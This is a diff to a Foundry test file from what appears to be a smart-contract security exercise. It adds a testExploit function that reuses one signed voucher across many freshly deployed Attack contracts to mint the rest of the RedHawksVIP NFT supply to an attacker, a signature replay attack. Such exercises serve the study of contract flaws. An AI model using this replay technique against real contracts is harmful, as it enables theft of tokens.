@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import {RedHawksVIP} from "src/replay-attack-3/RedHawksVIP.sol";
+import {Attack} from "src/replay-attack-3/Attack.sol";
 import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 
 /**
@@ -24,6 +25,7 @@ contract RedHawksTest is Test {
     bytes32 private constant _TYPE_HASH = keccak256('EIP712Domain(uint256 chainId,address verifyingContract)');
 
     RedHawksVIP redhaw;
+    Attack attack;
 
     function setUp() public {
         (voucherSigner, signerKey) = makeAddrAndKey("vaucher");
@@ -33,8 +35,25 @@ contract RedHawksTest is Test {
         vm.prank(deployer);
         
         redhaw = new RedHawksVIP(voucherSigner);
+        redhaw.mint(2, "1245", _getSignature());
+        redhaw.safeTransferFrom(address(this), deployer, 1);
+        redhaw.safeTransferFrom(address(this), deployer, 2);
+        assertEq(redhaw.balanceOf(deployer), 2);
         
-        // Sign message
+    }
+
+    function testExploit() public {
+        vm.startPrank(attacker);
+        uint16 toMint = redhaw.MAX_SUPPLY() - redhaw.currentSupply();
+        for (uint i = 1; i < toMint / 2; i++) {
+            attack = new Attack(address(redhaw));
+            attack.attack(_getSignature());
+        }
+        assertEq(redhaw.balanceOf(attacker), toMint);
+        vm.stopPrank();
+    }
+
+    function _getSignature() private view returns(bytes memory) {
         uint8 v;
         bytes32 r;
         bytes32 s;
@@ -53,20 +72,12 @@ contract RedHawksTest is Test {
 
         (v, r, s) = vm.sign(signerKey, dataHash);
         bytes memory signature = abi.encodePacked(r, s, v);
-        address signer = dataHash.recover(signature);
-        console.log(signer, voucherSigner);
-        redhaw.mint(2, "1245", signature);
-        assertEq(redhaw.balanceOf(address(this)), 2);
-    }
-
-    function testExploit() public {
-        
+        return signature;
     }
 
     function _domainSeparatorV4() internal view returns (bytes32) {
         return keccak256(abi.encode(_TYPE_HASH, block.chainid, address(redhaw)));
     }
-
 
     function _hashTypedDataV4(bytes32 structHash)
         internal
